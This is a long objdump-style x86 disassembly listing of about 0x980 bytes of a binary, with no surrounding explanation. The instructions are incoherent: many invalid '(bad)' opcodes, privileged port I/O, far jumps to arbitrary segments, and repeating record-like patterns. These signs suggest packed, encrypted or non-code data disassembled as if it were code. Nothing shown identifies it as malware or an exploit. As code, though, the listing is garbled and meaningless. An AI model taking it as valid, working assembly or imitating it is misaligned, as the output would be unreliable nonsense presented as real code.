  42aa84:	add    DWORD PTR [ebp+0x7be329e8],ebp
  42aa8a:	and    BYTE PTR ds:0xea47bf49,ah
  42aa90:	std    
  42aa91:	je     0x42aa18
  42aa93:	xchg   edi,eax
  42aa94:	push   0xb250d0aa
  42aa99:	or     DWORD PTR [eax-0x1f],0xffffffa4
  42aa9d:	ja     0x42ab16
  42aa9f:	psubsb mm0,mm5
  42aaa2:	div    ecx
  42aaa4:	jns    0x42ab1c
  42aaa6:	test   eax,0x966bcdb9
  42aaab:	mov    BYTE PTR [edx+0x1ba5d083],dl
  42aab1:	xchg   DWORD PTR ds:0xfb4b815,edi
  42aab7:	push   0x373d9292
  42aabc:	dec    ebp
  42aabd:	push   ebx
  42aabe:	mov    bh,0xc1
  42aac0:	stos   BYTE PTR es:[edi],al
  42aac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aac2:	jne    0x42aad4
  42aac4:	adc    eax,0xd0898628
  42aac9:	arpl   WORD PTR [edx-0xf],bp
  42aacc:	xchg   ebp,eax
  42aacd:	mov    eax,DWORD PTR [esi+0x23]
  42aad0:	adc    al,0x29
  42aad2:	and    bl,0x76
  42aad5:	inc    esi
  42aad6:	dec    edx
  42aad7:	in     eax,0xa1
  42aad9:	shl    edi,1
  42aadb:	xor    BYTE PTR [ebp+edx*4+0x3b],dl
  42aadf:	fiadd  WORD PTR [edx]
  42aae1:	inc    ecx
  42aae2:	jecxz  0x42ab2d
  42aae4:	aaa    
  42aae5:	sahf   
  42aae6:	mov    ebx,0x7d9055cd
  42aaeb:	xor    ecx,edx
  42aaed:	push   esp
  42aaee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aaef:	jo     0x42aaba
  42aaf1:	xor    dh,ah
  42aaf3:	push   eax
  42aaf4:	sub    DWORD PTR [edi],ebp
  42aaf6:	cmp    eax,0x536213c3
  42aafb:	add    DWORD PTR [ebp-0x58],0xffffffcb
  42aaff:	aaa    
  42ab00:	hlt    
  42ab01:	std    
  42ab02:	in     al,0x3b
  42ab04:	sbb    al,0x1d
  42ab06:	mov    BYTE PTR [edx],ah
  42ab08:	adc    al,0xb5
  42ab0a:	fwait
  42ab0b:	push   edx
  42ab0c:	xchg   DWORD PTR ds:0x379591,ecx
	...
  42ab72:	add    BYTE PTR [eax],al
  42ab74:	ds push cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	les    ebp,FWORD PTR [edi]
  42ab82:	cmp    al,0xd4
  42ab84:	fwait
  42ab85:	leave  
  42ab86:	add    DWORD PTR [eax],eax
  42ab88:	add    eax,0xf0000001
  42ab8d:	jno    0x42abea
  42ab8f:	adc    eax,0xa3e2f262
  42ab94:	loope  0x42ac0d
  42ab96:	call   0x3c41:0xeee4ae94
  42ab9d:	xor    dl,BYTE PTR [esp+eax*8+0x16b86dfe]
  42aba4:	aam    0x79
  42aba6:	lock fs jecxz 0x42ab9b
  42abaa:	or     al,0xd7
  42abac:	pop    edi
  42abad:	mov    ?,WORD PTR [eax+ebx*1]
  42abb0:	fld    st(6)
  42abb2:	ins    BYTE PTR es:[edi],dx
  42abb3:	jle    0x42ab8c
  42abb5:	lea    edx,[ebx+0x70]
  42abb8:	ret    0xdc83
  42abbb:	jo     0x42abe4
  42abbd:	outs   dx,BYTE PTR ds:[esi]
  42abbe:	sbb    ch,ah
  42abc0:	mov    ebp,0x75cec2db
  42abc5:	loopne 0x42ac3f
  42abc7:	call   0xdc25fa7c
  42abcc:	test   BYTE PTR [ecx-0x9],dh
  42abcf:	dec    esp
  42abd0:	cmp    eax,0x6a3d3a1e
  42abd5:	cmc    
  42abd6:	gs stos BYTE PTR es:[edi],al
  42abd8:	or     cl,0x31
  42abdb:	mul    ecx
  42abdd:	inc    esp
  42abde:	shr    DWORD PTR [edi+0x662f7919],0xe6
  42abe5:	(bad)  
  42abe6:	ins    DWORD PTR es:[edi],dx
  42abe7:	and    al,0xa1
  42abe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42abea:	in     al,dx
  42abeb:	out    0x98,eax
  42abed:	cmp    BYTE PTR [edx+0x2cf915ae],cl
  42abf3:	mov    bl,0xf5
  42abf6:	test   eax,0x323e1b8c
  42abfb:	jnp    0x42abf4
  42abfd:	pop    ds
  42abfe:	sub    dh,0x67
  42ac01:	ret    
  42ac02:	aaa    
  42ac03:	shl    DWORD PTR [ebp+0xf],cl
  42ac06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ac07:	bound  esp,QWORD PTR [esi]
  42ac09:	cli    
  42ac0a:	jno    0x42abbf
  42ac0c:	sub    al,0x28
  42ac0e:	pop    edi
  42ac0f:	jno    0x42abfb
  42ac11:	mov    al,0x92
  42ac13:	sbb    BYTE PTR [edi+0x1246b6b],al
  42ac19:	cs pop edi
  42ac1b:	repz rcl BYTE PTR [ecx+eax*8],1
  42ac1f:	cdq    
  42ac20:	mov    eax,ds:0x9686acfc
  42ac25:	imul   ebx,DWORD PTR [ebp-0x24bdbda8],0x95bdad64
  42ac2f:	mov    eax,0xda8ba7f0
  42ac34:	xor    ebx,DWORD PTR [edi+0x7693a8f8]
  42ac3a:	mul    ah
  42ac3c:	aad    0xa1
  42ac3e:	xor    ebx,ecx
  42ac40:	out    0xcd,eax
  42ac42:	out    0x83,al
  42ac44:	inc    edi
  42ac45:	or     eax,0x2f124200
  42ac4a:	enter  0xfc6e,0xdb
  42ac4e:	mov    ds:0xf6b293c5,al
  42ac53:	mov    bl,0x94
  42ac55:	jno    0x42ac69
  42ac57:	mov    DWORD PTR [eax-0x138288d5],ebp
  42ac5d:	push   ds
  42ac5e:	jmp    0x42ac6f
  42ac60:	mov    ch,0xdb
  42ac62:	adc    eax,0x5a971433
  42ac67:	ret    
  42ac68:	stc    
  42ac69:	xchg   esi,eax
  42ac6a:	inc    edi
  42ac6b:	sbb    al,0xed
  42ac6d:	xor    DWORD PTR [eax+0x1e088795],ecx
  42ac73:	sbb    al,0xa8
  42ac75:	xchg   esp,eax
  42ac76:	mov    ebx,DWORD PTR [eax+0x47]
  42ac79:	cld    
  42ac7a:	aam    0xb5
  42ac7c:	cld    
  42ac7d:	into   
  42ac7e:	les    esp,FWORD PTR ds:0xc68b4d01
  42ac84:	lea    esi,[ebx-0x2d]
  42ac87:	jle    0x42ac87
  42ac89:	mov    bl,0xfd
  42ac8b:	(bad)  
  42ac8d:	xchg   edx,eax
  42ac8e:	mov    ch,0x38
  42ac90:	retf   0x0
	...
  42acf3:	add    cl,ch
  42acf5:	xor    bl,BYTE PTR [edx+edi*1]
  42acf8:	fistp  QWORD PTR [esi]
  42acfa:	out    dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	cmp    DWORD PTR [esi+0x68],esp
  42ad03:	push   fs
  42ad05:	retf   0x1
  42ad08:	add    eax,0x5b000001
  42ad0d:	stc    
  42ad0e:	sbb    dh,0x92
  42ad11:	daa    
  42ad12:	scas   al,BYTE PTR es:[edi]
  42ad13:	clc    
  42ad14:	aam    0x7f
  42ad16:	mov    ecx,0x15c2fd43
  42ad1b:	cld    
  42ad1c:	jl     0x42ad24
  42ad1e:	inc    eax
  42ad1f:	lea    ecx,[ebx]
  42ad21:	or     eax,0xd1668368
  42ad26:	mov    WORD PTR [eax+0xb],?
  42ad29:	sbb    DWORD PTR [edx+0xe8e6111],edx
  42ad2f:	aaa    
  42ad30:	push   edi
  42ad31:	xchg   esi,eax
  42ad32:	int    0xe8
  42ad34:	push   ebp
  42ad35:	dec    DWORD PTR [edi-0x56]
  42ad38:	pop    ecx
  42ad39:	rcr    ecx,cl
  42ad3b:	lahf   
  42ad3c:	in     al,dx
  42ad3d:	or     DWORD PTR [esi+0x2d],ebx
  42ad40:	jmp    FWORD PTR [eax+0x4]
  42ad43:	sub    dl,BYTE PTR [ebx-0x34aa1f0e]
  42ad49:	sub    BYTE PTR [ebp+edi*1+0x60f2bbd0],al
  42ad50:	ss xor al,0xe6
  42ad53:	cmp    ebp,ebx
  42ad55:	sbb    ebx,DWORD PTR [edx]
  42ad57:	xchg   edi,eax
  42ad58:	pop    edi
  42ad59:	xor    al,BYTE PTR [ebp+0x6de17b14]
  42ad5f:	and    eax,0xbabf3148
  42ad64:	xchg   sp,ax
  42ad66:	push   esi
  42ad67:	dec    eax
  42ad68:	mov    ds:0xbdf171ea,al
  42ad6d:	fld    DWORD PTR [edx+edi*4]
  42ad70:	ss inc esi
  42ad72:	rol    esp,1
  42ad74:	mov    bh,0xaa
  42ad76:	inc    eax
  42ad77:	dec    eax
  42ad78:	mul    BYTE PTR [ecx+0x58c7f081]
  42ad7e:	mov    ds:0x55b0c2c2,al
  42ad83:	mov    ah,0x51
  42ad85:	push   ecx
  42ad86:	dec    ebp
  42ad87:	sbb    dh,BYTE PTR [ecx]
  42ad89:	test   BYTE PTR [esi-0x44],bh
  42ad8c:	jno    0x42ade5
  42ad8e:	mov    bh,0xf6
  42ad90:	imul   edx,edi,0xc11d79eb
  42ad96:	je     0x42ae12
  42ad98:	add    esi,DWORD PTR [ebp-0x79]
  42ad9b:	mov    ss,edx
  42ad9d:	xchg   DWORD PTR [edi],edi
  42ad9f:	iret   
  42ada0:	out    dx,al
  42ada1:	repz pop esi
  42ada3:	pusha  
  42ada4:	jge    0x42ad9f
  42ada6:	cmp    BYTE PTR [eax-0x4f1c9dfd],bl
  42adac:	mov    DWORD PTR [ecx-0x49662478],ebx
  42adb2:	mov    esp,0x158cf7b5
  42adb7:	push   eax
  42adb8:	sbb    ecx,DWORD PTR [esi]
  42adba:	mov    bh,0xdc
  42adbc:	xor    ecx,DWORD PTR [esi+0xac2953e]
  42adc2:	aad    0xf4
  42adc4:	xchg   ecx,eax
  42adc5:	cmp    edi,DWORD PTR ds:0x4ffde69a
  42adcb:	aad    0xb6
  42adcd:	pop    es
  42adce:	or     dh,al
  42add0:	xchg   edx,eax
  42add1:	mov    esi,DWORD PTR [esi+0x36004453]
  42add7:	test   bl,dl
  42add9:	lock inc BYTE PTR [edx+0x3ca633d6]
  42ade0:	xchg   ebx,eax
  42ade1:	pop    ecx
  42ade2:	dec    esp
  42ade3:	mov    ah,0xce
  42ade5:	cwde   
  42ade6:	sub    eax,0x5956533f
  42adeb:	(bad)  
  42adec:	mov    ds:0xd41ea604,eax
  42adf1:	and    BYTE PTR [ebx-0x59574dcd],ch
  42adf7:	cmc    
  42adf8:	ror    BYTE PTR [edi],1
  42adfa:	data16 stc 
  42adfc:	addr16 jmp 0xf76cd247
  42ae02:	adc    ebp,ecx
  42ae04:	or     DWORD PTR [ebp+0x9],eax
  42ae07:	adc    ecx,ecx
  42ae09:	and    ebp,DWORD PTR [ebp+0x6b]
  42ae0c:	test   DWORD PTR ds:0x5e83c8,esp
	...
  42ae72:	add    BYTE PTR [eax],al
  42ae74:	mov    edi,0x4a8e4af7
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	aaa    
  42ae81:	stc    
  42ae82:	mov    edx,ebp
  42ae84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ae85:	retf   
  42ae86:	add    DWORD PTR [eax],eax
  42ae88:	add    eax,0x9e000001
  42ae8d:	jg     0x42ae39
  42ae8f:	ins    BYTE PTR es:[edi],dx
  42ae90:	push   esi
  42ae91:	cdq    
  42ae92:	mov    bl,0xf6
  42ae94:	cmp    al,0x6
  42ae96:	fnsave [esi]
  42ae98:	cwde   
  42ae99:	add    ah,BYTE PTR [ecx+esi*2]
  42ae9c:	xor    BYTE PTR [edx],ah
  42ae9e:	push   esi
  42ae9f:	inc    esi
  42aea0:	mov    bh,0x22
  42aea2:	adc    al,BYTE PTR [ebp+0x1d3313bb]
  42aea8:	sub    eax,0x1075a428
  42aead:	xchg   ebp,eax
  42aeae:	jmp    0x42ae95
  42aeb0:	outs   dx,DWORD PTR ds:[esi]
  42aeb1:	mov    ebx,DWORD PTR [ecx-0x31]
  42aeb4:	pushf  
  42aeb5:	(bad)  [esi-0x4a92217]
  42aebb:	outs   dx,BYTE PTR ds:[esi]
  42aebc:	out    0x0,eax
  42aebe:	sti    
  42aebf:	mov    al,ds:0x9225ca27
  42aec4:	mov    ah,0x21
  42aec6:	xor    al,0x53
  42aec8:	ficomp WORD PTR [eax-0x28]
  42aecb:	cmovg  esi,edi
  42aece:	dec    ebp
  42aecf:	dec    ebp
  42aed0:	imul   esp,DWORD PTR [edi+0x37c4aa7c],0x8e54448f
  42aeda:	imul   BYTE PTR [ecx-0x7b]
  42aedd:	test   ah,al
  42aedf:	in     al,dx
  42aee0:	cmp    esp,edx
  42aee2:	in     eax,0x9d
  42aee4:	xchg   esi,eax
  42aee5:	jbe    0x42af4b
  42aee7:	lds    ebp,FWORD PTR [edx-0x16]
  42aeea:	mov    ds:0xfaa74797,al
  42aeef:	fisub  DWORD PTR [esi+0x1ca3f5f9]
  42aef5:	pop    ss
  42aef6:	inc    esi
  42aef7:	shl    DWORD PTR [edx+0x17],cl
  42aefa:	dec    ebp
  42aefb:	pop    edi
  42aefc:	add    BYTE PTR [eax],dl
  42aefe:	pop    ss
  42aeff:	dec    ebx
  42af00:	stos   BYTE PTR es:[edi],al
  42af01:	pop    ecx
  42af02:	sub    DWORD PTR [ecx],esp
  42af04:	icebp  
  42af05:	test   al,0xfb
  42af07:	pop    edi
  42af08:	imul   ecx,edi,0xabddab5
  42af0e:	data16 jo 0x42af30
  42af11:	(bad)  
  42af12:	and    eax,0x825631ff
  42af17:	ret    
  42af18:	(bad)  
  42af19:	into   
  42af1a:	push   0x33
  42af1c:	pusha  
  42af1d:	ja     0x42af77
  42af1f:	inc    ebx
  42af20:	loope  0x42aee3
  42af22:	or     edx,DWORD PTR [edi]
  42af24:	xlat   BYTE PTR ds:[ebx]
  42af25:	xor    bl,BYTE PTR [ebp-0x7b]
  42af28:	push   eax
  42af29:	retf   
  42af2a:	lahf   
  42af2b:	mov    ah,BYTE PTR [ebx]
  42af2d:	arpl   cx,sp
  42af2f:	(bad)  
  42af30:	push   0xffffffe2
  42af32:	nop
  42af33:	inc    esp
  42af34:	sub    bl,bl
  42af36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af37:	rol    BYTE PTR [ebp+0x7a],cl
  42af3a:	(bad)  
  42af3b:	xor    DWORD PTR [ecx],ecx
  42af3d:	push   eax
  42af3e:	pop    ebx
  42af3f:	jo     0x42af13
  42af41:	add    al,0x7c
  42af43:	pop    esi
  42af44:	add    dh,BYTE PTR [esi]
  42af46:	cmp    al,0xbd
  42af48:	or     cl,bh
  42af4a:	add    eax,edi
  42af4c:	jmp    0x735a:0xd42a757e
  42af53:	xchg   ebp,eax
  42af54:	aam    0xb3
  42af56:	xchg   edx,eax
  42af57:	call   0x506307d7
  42af5c:	mov    ebp,0xd8d8762
  42af61:	push   es
  42af62:	mov    WORD PTR [edx],es
  42af64:	push   ds
  42af65:	adc    dh,ch
  42af67:	or     BYTE PTR fs:[ecx-0x57],bh
  42af6b:	scas   eax,DWORD PTR es:[edi]
  42af6c:	inc    ecx
  42af6d:	adc    edi,DWORD PTR [eax+ebx*2]
  42af70:	jge    0x42af74
  42af72:	outs   dx,BYTE PTR ds:[esi]
  42af73:	ret    0x8be5
  42af76:	sub    dl,bh
  42af78:	jl     0x42af91
  42af7a:	rol    bl,1
  42af7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af7d:	int3   
  42af7e:	mov    ecx,0x844850a3
  42af83:	jb     0x42afb9
  42af85:	(bad)  
  42af86:	sbb    DWORD PTR [edx-0x51],eax
  42af89:	jmp    0x42af95
  42af8b:	loop   0x42afc2
  42af8d:	ss adc al,0xce
  42af90:	jle    0x42af92
	...
  42aff2:	add    BYTE PTR [eax],al
  42aff4:	stc    
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	and    DWORD PTR [edi+0xd],ebp
  42b003:	dec    ebx
  42b004:	stos   BYTE PTR es:[edi],al
  42b005:	int3   
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    eax,0xe6000001
  42b00d:	lods   al,BYTE PTR ds:[esi]
  42b00e:	cmp    ah,cl
  42b010:	imul   ebp,DWORD PTR [edi],0x4b
  42b013:	mov    ah,0x7d
  42b015:	lea    esi,ds:0x60c26f34
  42b01b:	cmp    ah,cl
  42b01d:	and    BYTE PTR [ecx-0x2ec28a34],0xb9
  42b024:	xchg   esp,ebp
  42b026:	add    ecx,DWORD PTR [esi-0x4a]
  42b029:	mov    esi,0x7647a8d9
  42b02e:	dec    ecx
  42b02f:	test   BYTE PTR [ebp+0x29],0xef
  42b033:	pop    ss
  42b034:	and    al,0xd4
  42b036:	lods   eax,DWORD PTR ds:[esi]
  42b037:	pop    ds
  42b038:	dec    edi
  42b039:	inc    esp
  42b03a:	ficom  WORD PTR [edx]
  42b03c:	out    dx,al
  42b03d:	inc    ecx
  42b03e:	cmp    DWORD PTR [esi+ebp*4],edx
  42b041:	test   BYTE PTR [esi+0x726089a5],0xf4
  42b048:	lea    ecx,[ebp-0x720f9d7a]
  42b04e:	and    eax,edx
  42b050:	cli    
  42b051:	neg    ebx
  42b053:	fidiv  WORD PTR [eax-0x6df7f3a9]
  42b059:	mov    DWORD PTR [eax],ebx
  42b05b:	push   es
  42b05c:	cwde   
  42b05d:	inc    bx
  42b05f:	pop    ebp
  42b060:	ret    0xd6aa
  42b063:	adc    eax,0xaec7fc4
  42b068:	test   al,0xc2
  42b06a:	xor    BYTE PTR [edx],0x92
  42b06d:	adc    bl,BYTE PTR [ebx+0x196d5b5a]
  42b073:	push   esi
  42b074:	fimul  DWORD PTR [edi+ebx*1+0x3f685185]
  42b07b:	dec    edi
  42b07c:	pushf  
  42b07d:	cdq    
  42b07e:	or     DWORD PTR [esi],0xffffff9b
  42b081:	fdivr  DWORD PTR [edi-0x34]
  42b084:	call   0x6121:0xccc191a4
  42b08b:	ins    BYTE PTR es:[edi],dx
  42b08c:	icebp  
  42b08d:	xchg   ebp,eax
  42b08e:	inc    ecx
  42b08f:	xchg   edx,eax
  42b090:	add    DWORD PTR [ecx+0x3257351e],eax
  42b096:	rcl    BYTE PTR [esi],0x40
  42b099:	sbb    edi,DWORD PTR [ecx]
  42b09b:	mov    ch,0xa2
  42b09d:	sti    
  42b09e:	(bad)
  42b0a2:	aaa    
  42b0a3:	ja     0x42b106
  42b0a5:	test   eax,0x58d0d747
  42b0aa:	mov    ecx,0x590b275e
  42b0af:	popf   
  42b0b0:	mul    ch
  42b0b2:	int    0x63
  42b0b4:	aad    0x1b
  42b0b6:	xlat   BYTE PTR ds:[ebx]
  42b0b7:	test   al,0xdb
  42b0b9:	loopne 0x42b11a
  42b0bb:	xor    eax,0x126f63ba
  42b0c0:	adc    DWORD PTR [edi],0xfffffff5
  42b0c3:	pop    ds
  42b0c4:	push   esi
  42b0c5:	ins    DWORD PTR es:[edi],dx
  42b0c6:	loopne 0x42b061
  42b0c8:	ror    BYTE PTR [ebp+ecx*8+0x5b],cl
  42b0cc:	sbb    dh,BYTE PTR [ecx+eiz*4+0x39]
  42b0d0:	pop    esp
  42b0d1:	in     eax,dx
  42b0d2:	fidivr DWORD PTR [ecx+0x49]
  42b0d5:	and    eax,0x52275efd
  42b0da:	adc    edi,ebx
  42b0dc:	mov    al,ah
  42b0de:	mov    al,0xa5
  42b0e0:	popf   
  42b0e1:	sbb    BYTE PTR [edi-0x61],cl
  42b0e4:	je     0x42b0cf
  42b0e6:	mov    bl,0xd7
  42b0e8:	add    ebx,DWORD PTR [ecx]
  42b0ea:	jns    0x42b0a3
  42b0ec:	jge    0x42b15d
  42b0ee:	in     eax,dx
  42b0ef:	sar    BYTE PTR [esp+ecx*8],cl
  42b0f2:	hlt    
  42b0f3:	aad    0x59
  42b0f5:	(bad)  
  42b0f6:	push   ss
  42b0f7:	in     al,0x41
  42b0f9:	mov    ecx,0xa16a909a
  42b0fe:	adc    DWORD PTR [eax+0x71],ebp
  42b101:	out    dx,al
  42b102:	aas    
  42b103:	and    esi,DWORD PTR [edx-0x1a6c8945]
  42b109:	or     DWORD PTR [ebx+ebp*2+0x76a39481],0x19
	...
  42b174:	jne    0x42b19b
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	jp     0x42b1b7
  42b182:	gs retf 0xcdaf
  42b186:	add    DWORD PTR [eax],eax
  42b188:	add    eax,0x47000001
  42b18d:	sbb    BYTE PTR [edi+0x12],ah
  42b190:	push   0xe45c73d4
  42b195:	jp     0x42b141
  42b197:	or     ebx,esp
  42b199:	or     bl,BYTE PTR [ebp-0x5d]
  42b19c:	imul   ecx,DWORD PTR [ebx],0xffffffe9
  42b19f:	xchg   esp,eax
  42b1a0:	jns    0x42b190
  42b1a2:	push   cs
  42b1a3:	sub    dl,dl
  42b1a5:	jl     0x42b220
  42b1a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b1a8:	xchg   al,ch
  42b1aa:	or     DWORD PTR ds:0x5a31b395,esp
  42b1b0:	arpl   WORD PTR [edi+0x2],ax
  42b1b3:	adc    al,0xb8
  42b1b5:	sbb    BYTE PTR [ecx+0x70],bl
  42b1b8:	(bad)  [eax-0x17406d93]
  42b1be:	sar    DWORD PTR [esp+edi*4+0x5fad9e91],1
  42b1c5:	push   esi
  42b1c6:	jb     0x42b218
  42b1c8:	das    
  42b1c9:	cwde   
  42b1ca:	std    
  42b1cb:	xchg   ecx,eax
  42b1cc:	pop    ds
  42b1cd:	ss add ah,al
  42b1d0:	sbb    esi,edi
  42b1d2:	stos   BYTE PTR es:[edi],al
  42b1d3:	popa   
  42b1d4:	mov    ebp,0xa530319f
  42b1d9:	popa   
  42b1da:	sbb    DWORD PTR [eax-0x3ed07c22],edx
  42b1e0:	(bad)  
  42b1e1:	push   esi
  42b1e2:	cwde   
  42b1e3:	je     0x42b1a8
  42b1e5:	(bad)  
  42b1e6:	out    0xd6,al
  42b1e8:	mov    bl,0x4
  42b1ea:	push   0x6a2cb6eb
  42b1ef:	pop    ecx
  42b1f0:	imul   ebx,eax,0xffffff8a
  42b1f3:	fistp  WORD PTR [edx+0x23]
  42b1f6:	jmp    0x5944f9e9
  42b1fb:	push   0x1e
  42b1fd:	mov    eax,0x7f56717c
  42b202:	cli    
  42b203:	scas   al,BYTE PTR es:[edi]
  42b204:	std    
  42b205:	js     0x42b1db
  42b207:	or     BYTE PTR [edx+0x5],dh
  42b20a:	and    edx,edx
  42b20c:	mov    esi,0x47c2ba
  42b211:	mov    BYTE PTR [eax-0x67],bh
  42b214:	fwait
  42b215:	jp     0x42b277
  42b217:	adc    eax,DWORD PTR [ebx+esi*2]
  42b21a:	push   ebp
  42b21b:	pop    ss
  42b21c:	sahf   
  42b21d:	jmp    0xd79d:0xaaeff4b6
  42b224:	or     ebp,DWORD PTR [ecx-0x3b]
  42b227:	pop    ds
  42b228:	pop    ecx
  42b229:	lds    eax,FWORD PTR [edi]
  42b22b:	aam    0xbe
  42b22d:	shl    DWORD PTR [ebx],cl
  42b22f:	mov    bh,0x5
  42b231:	mov    esi,0x6bb07fb0
  42b236:	and    BYTE PTR [ebx-0x2d6e69a1],ah
  42b23c:	jbe    0x42b1fb
  42b23e:	loop   0x42b1ef
  42b240:	xor    al,BYTE PTR [edx-0x502f8a60]
  42b246:	rdpmc  
  42b248:	adc    ah,bh
  42b24a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b24b:	pop    ss
  42b24c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b24d:	call   0xefd94c5c
  42b252:	scas   eax,DWORD PTR es:[edi]
  42b253:	jp     0x42b1da
  42b255:	mov    BYTE PTR es:[ebp-0x7fffc724],dh
  42b25c:	cmp    BYTE PTR [eax],ch
  42b25e:	ins    BYTE PTR es:[edi],dx
  42b25f:	inc    esp
  42b260:	adc    al,0x39
  42b262:	sub    al,0x60
  42b264:	add    ebx,DWORD PTR [eax-0x55]
  42b267:	sbb    eax,0xea675aa8
  42b26c:	ror    bl,1
  42b26e:	and    DWORD PTR [esi],0x808e758d
  42b274:	jnp    0x42b2a5
  42b276:	daa    
  42b277:	std    
  42b278:	daa    
  42b279:	cmp    eax,0x2aeb32d5
  42b27e:	or     eax,ecx
  42b280:	iret   
  42b281:	pop    ecx
  42b282:	adc    esp,edi
  42b284:	imul   edi,DWORD PTR [ebx],0x6b05ce0
  42b28a:	adc    esi,DWORD PTR [ebp-0x356c1b3b]
  42b290:	cmp    al,0x0
	...
  42b2f2:	add    BYTE PTR [eax],al
  42b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2f5:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b2fb:	iret   
  42b2fc:	sub    eax,0xb1738e65
  42b301:	in     eax,0x18
  42b303:	imul   esi,DWORD PTR [esi+ecx*8+0x1050001],0x235b0000
  42b30e:	jmp    0xc6d1:0xbb2f4f05
  42b315:	push   edx
  42b316:	or     al,0x79
  42b318:	adc    edx,DWORD PTR [ecx-0x2a]
  42b31b:	ds icebp 
  42b31d:	mov    BYTE PTR [edi],dl
  42b31f:	add    ah,BYTE PTR [edx+0x7f]
  42b322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b323:	dec    edi
  42b324:	and    ah,BYTE PTR [esp+eax*4]
  42b327:	add    dh,BYTE PTR [edx]
  42b329:	sub    al,0x97
  42b32b:	test   al,0xa9
  42b32d:	mov    BYTE PTR [ecx-0x3],al
  42b330:	lods   eax,DWORD PTR ds:[esi]
  42b331:	out    dx,al
  42b332:	and    esi,ecx
  42b334:	rcr    BYTE PTR [esp+edi*4],1
  42b337:	and    edx,0xef104527
  42b33d:	stos   BYTE PTR es:[edi],al
  42b33e:	outs   dx,BYTE PTR ds:[esi]
  42b33f:	cwde   
  42b340:	loopne 0x42b3bd
  42b342:	cld    
  42b343:	inc    esp
  42b344:	adc    ah,al
  42b346:	std    
  42b347:	les    edx,FWORD PTR [ebx+0x3d26e91]
  42b34d:	cmp    al,0xc9
  42b34f:	rol    BYTE PTR [eax-0x65],cl
  42b352:	ins    DWORD PTR es:[edi],dx
  42b353:	adc    DWORD PTR [ecx],esp
  42b355:	stc    
  42b356:	pop    ecx
  42b357:	out    dx,al
  42b358:	dec    eax
  42b359:	in     eax,dx
  42b35a:	cmp    al,0xf2
  42b35c:	xchg   ebp,eax
  42b35d:	push   0xfffffff3
  42b35f:	sahf   
  42b360:	xchg   edx,eax
  42b361:	inc    ebp
  42b362:	xchg   ebx,eax
  42b363:	mov    WORD PTR [eax+0x42],gs
  42b366:	dec    ebx
  42b367:	retf   0x2402
  42b36a:	clc    
  42b36b:	sub    DWORD PTR [esp+edi*2+0x2dd166d0],0x1089d435
  42b376:	inc    ebx
  42b377:	xchg   ecx,eax
  42b378:	call   DWORD PTR [esi-0x10]
  42b37b:	nop
  42b37c:	lock stc 
  42b37e:	adc    eax,0x751f9960
  42b383:	adc    BYTE PTR [eax],dh
  42b385:	loopne 0x42b35e
  42b387:	std    
  42b388:	xchg   ecx,eax
  42b389:	pop    ds
  42b38a:	iret   
  42b38b:	inc    ebx
  42b38c:	xor    eax,0x175f3b5a
  42b391:	frstpm(287 only) 
  42b393:	in     eax,0x24
  42b395:	sbb    DWORD PTR [eax+eax*2],0x3c80ab3f
  42b39c:	in     eax,0x4
  42b39e:	(bad)  
  42b39f:	xchg   ebp,eax
  42b3a0:	stos   DWORD PTR es:[edi],eax
  42b3a1:	xlat   BYTE PTR ds:[ebx]
  42b3a2:	inc    eax
  42b3a3:	jmp    0xf503d557
  42b3a8:	cmc    
  42b3a9:	sti    
  42b3aa:	(bad)  
  42b3ab:	jb     0x42b3e4
  42b3ad:	cmp    al,BYTE PTR [esi]
  42b3af:	cmp    al,dh
  42b3b1:	xchg   ebx,ebx
  42b3b3:	lds    edi,FWORD PTR [edx+0x4e]
  42b3b6:	cmp    ah,BYTE PTR [eax+0x51]
  42b3b9:	mov    WORD PTR [ebx-0x6bc78ccb],?
  42b3bf:	push   ss
  42b3c0:	ret    0x4e72
  42b3c3:	xchg   ecx,eax
  42b3c4:	lahf   
  42b3c5:	push   esi
  42b3c6:	adc    eax,0x4d1b5801
  42b3cb:	inc    eax
  42b3cc:	xor    DWORD PTR [edx-0x62],0x7e
  42b3d0:	xor    al,BYTE PTR [edi+0x7d]
  42b3d3:	sbb    BYTE PTR [esp+esi*2-0x60],bh
  42b3d7:	inc    edi
  42b3d8:	lds    ecx,FWORD PTR [edx+0xeb69159]
  42b3de:	xchg   esp,eax
  42b3df:	pop    esp
  42b3e0:	adc    eax,DWORD PTR [ecx+0xc]
  42b3e3:	pop    ds
  42b3e4:	in     al,0x1a
  42b3e6:	pop    esi
  42b3e7:	pop    eax
  42b3e8:	sub    al,0xb7
  42b3ea:	mov    bh,0x92
  42b3ec:	mov    WORD PTR ds:0xbaad7dfc,gs
  42b3f2:	rcr    DWORD PTR [edx-0x4466a023],0x1f
  42b3f9:	iret   
  42b3fa:	idiv   BYTE PTR [edx]
  42b3fc:	and    BYTE PTR [esi-0x2b2b0132],cl
  42b402:	sub    dh,BYTE PTR [ebp+0x1f928fe]
  42b408:	loopne 0x42b468
  42b40a:	or     ecx,DWORD PTR [ecx-0x18]
